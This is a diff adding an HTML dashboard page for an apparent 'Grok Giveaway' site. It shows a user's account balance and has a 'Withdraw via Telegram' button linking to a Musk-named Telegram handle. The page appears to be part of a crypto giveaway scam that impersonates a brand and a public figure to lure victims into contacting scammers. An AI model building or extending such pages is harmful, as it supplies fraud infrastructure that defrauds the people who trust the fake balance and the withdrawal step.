@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Dashboard — Grok Giveaway</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <img src="assets/logo.svg" alt="Logo" class="logo">
+      <nav class="nav">
+        <a href="index.html">Home</a>
+        <a href="dashboard.html">Dashboard</a>
+      </nav>
+    </div>
+  </header>
+
+  <div class="dashboard container">
+    <h1>Your Account</h1>
+    <p><b>Welcome, <span id="userName"></span></b></p>
+    <div class="balance-card">
+      <h2>Balance: $<span id="balance"></span></h2>
+      <button class="btn-primary" onclick="window.location.href='https://t.me/ClaimCenterMusk001'">
+        Withdraw via Telegram
+      </button>
+    </div>
+    <div class="history">
+      <h3>Recent Activity</h3>
+      <ul id="historyList"></ul>
+    </div>
+    <button class="btn-outline" onclick="logout()">Logout</button>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
